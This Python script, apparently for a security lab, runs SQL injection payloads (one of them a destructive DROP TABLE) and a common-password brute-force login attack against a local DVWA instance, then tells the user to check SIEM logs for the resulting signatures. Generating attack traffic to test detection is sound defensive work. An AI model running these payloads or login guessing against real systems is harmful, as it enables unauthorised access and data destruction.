import requests
import time
import random

# Target configuration
TARGET_URL = "http://localhost:8080"
USERNAME = "admin"
PASSWORD = "password"

# Attack payloads
SQL_PAYLOADS = [
    "1' OR '1'='1",
    "1' UNION SELECT null,null",
    "1'; DROP TABLE users--",
    "admin'--"
]

BRUTE_FORCE_PASSWORDS = [
    "password", "123456", "admin", "letmein", 
    "welcome", "monkey", "dragon", "master"
]

def test_connection():
    """Test if DVWA is reachable"""
    try:
        response = requests.get(TARGET_URL, timeout=5)
        if response.status_code == 200:
            print(f"✓ Connection successful to {TARGET_URL}")
            return True
        else:
            print(f"✗ Got response code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"✗ Connection failed: {e}")
        return False

def sql_injection_attack():
    """Perform SQL injection attacks"""
    print("\n[+] Starting SQL Injection attacks...")
    
    # SQL injection endpoint
    sqli_url = f"{TARGET_URL}/vulnerabilities/sqli/"
    
    for payload in SQL_PAYLOADS:
        try:
            # Parameters for the SQL injection form
            params = {
                'id': payload,
                'Submit': 'Submit'
            }
            
            response = requests.get(sqli_url, params=params, timeout=5)
            
            print(f"Trying payload: {payload}")
            print(f"Response code: {response.status_code}")
            
            # Check if attack was successful
            if "First name" in response.text and "Surname" in response.text:
                print("✓ SQL injection successful - data extracted!")
            else:
                print("✗ SQL injection failed")
                
            # Add delay between attacks
            time.sleep(random.uniform(1, 3))
            
        except requests.exceptions.RequestException as e:
            print(f"✗ Request failed: {e}")

def brute_force_attack():
    """Perform brute force login attacks"""
    print("\n[+] Starting Brute Force attacks...")
    
    login_url = f"{TARGET_URL}/login.php"
    
    for password in BRUTE_FORCE_PASSWORDS:
        try:
            # Login form data
            login_data = {
                'username': USERNAME,
                'password': password,
                'Login': 'Login'
            }
            
            response = requests.post(login_url, data=login_data, timeout=5)
            
            print(f"Trying {USERNAME}:{password}")
            print(f"Response code: {response.status_code}")
            
            # Check if login was successful
            if "Welcome" in response.text or "dashboard" in response.text.lower():
                print(f"✓ Login successful with {USERNAME}:{password}")
            else:
                print("✗ Login failed")
                
            # Add delay between attempts
            time.sleep(random.uniform(2, 4))
            
        except requests.exceptions.RequestException as e:
            print(f"✗ Login attempt failed: {e}")

def main():
    """Main execution function"""
    print("=== DVWA Security Testing Script ===")
    print("This script will perform automated security tests\n")
    
    # Test connection first
    if not test_connection():
        print("Cannot reach DVWA. Make sure it's running on localhost:8080")
        return
    
    # Run attacks
    try:
        sql_injection_attack()
        brute_force_attack()
        
        print("\n=== Attack Summary ===")
        print("✓ SQL injection tests completed")
        print("✓ Brute force tests completed")
        print("Check your SIEM logs for attack signatures!")
        
    except KeyboardInterrupt:
        print("\n\n[!] Attack stopped by user")
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")

if __name__ == "__main__":
    main()
